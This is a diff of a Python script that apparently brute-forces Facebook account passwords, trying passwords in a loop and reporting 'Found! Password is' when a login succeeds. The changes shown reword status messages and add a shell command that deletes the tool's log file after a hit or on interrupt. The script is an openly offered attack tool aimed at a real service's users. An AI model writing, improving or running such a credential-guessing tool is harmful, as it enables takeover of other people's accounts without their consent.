@@ -4,8 +4,7 @@
 #I Love Python(^-^)
 
 ##-------- Import Libraries --------##
-import socket,time,os	            ##
-import optparse			    ##
+import socket,time,os,optparse	    ##
 ##----------------------------------##
 
 ################## check internet #################
@@ -44,7 +43,7 @@ def Main():
      try:
 	import mechanize
      except:
-	   print("The [ mechanize lib ] is Not found!\n[*]Please run this command> [ pip install mechanize ]")
+	   print("[!] The [ mechanize lib ] is Not found!\n[*]Please run this command> [ pip install mechanize ]")
 	   exit()
 
      global check
@@ -83,16 +82,20 @@ def Main():
                 		             text=dos1.read().decode("UTF-8")
                 		             if(text.find("home_icon",0,len(text))!=-1):
                    			        print ("\n[*]Found! Password is ==> "+ password)
+						dos1.close()
+						os.system("rm Facebook-Log.txt || del Facebook-Log.txt")
 					        exit()
                 		             else:
                     			          print ('[!]Trying password:[%s--[%s '%(lo,password))
 						  lo +=1
 
             			          except KeyboardInterrupt:
-                                                 print('\n---------------------------\n[!] Something went wrong!\n[!]Brute Force Attack Stop!\n')
+                                                 print('\n---------------------------\n[!][CTRL+C] Exiting.....!\n')
+						 dos1.close()
+						 os.system("rm Facebook-Log.txt || del Facebook-Log.txt")
 						 exit()
      elif check == False:
-		    print("\n[!]Please Connect to the internet and try again :)")
+		    print("\n[!] Please Check Your Internet Connection !!!")
 		    exit(0)
    else:
 	print(parse.usage)
